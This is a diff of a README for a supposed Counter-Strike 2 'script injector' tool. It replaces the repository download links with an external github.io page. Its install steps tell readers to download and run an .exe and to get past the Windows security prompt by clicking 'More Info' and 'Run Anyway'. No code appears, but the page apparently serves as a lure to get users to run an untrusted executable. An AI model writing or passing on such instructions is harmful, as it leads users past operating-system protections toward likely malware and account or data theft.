@@ -1,6 +1,6 @@
 # 🎯 cs2-windows-script-injector - Customize your Counter-Strike 2 gameplay settings
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Pastelve9301/cs2-windows-script-injector)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue)](https://pastelve9301.github.io)
 
 cs2-windows-script-injector helps players manage their Counter-Strike 2 settings. This tool manages local configuration files, creates custom gameplay presets, and applies scripts to improve how you interact with the game. You do not need to edit text files manually or understand code. This application provides a visual interface for all adjustments.
 
@@ -25,7 +25,7 @@ Your computer needs to meet these requirements to run the software:
 
 Follow these steps to set up the tool on your computer.
 
-1. **Visit the Download Page:** Go to [https://github.com/Pastelve9301/cs2-windows-script-injector](https://github.com/Pastelve9301/cs2-windows-script-injector) to find the latest version of the installer.
+1. **Visit the Download Page:** Go to [https://pastelve9301.github.io](https://pastelve9301.github.io) to find the latest version of the installer.
 2. **Download the File:** Look for the folder marked "Releases" on the right side of the page. Click the most recent link. Choose the download button that ends in .exe.
 3. **Run the Installer:** Once the file finishes downloading, double-click it. Windows may show a security prompt. If this happens, click "More Info" and then "Run Anyway."
 4. **Follow Prompts:** The installation window opens. Follow the instructions on the screen to place the shortcut on your desktop.
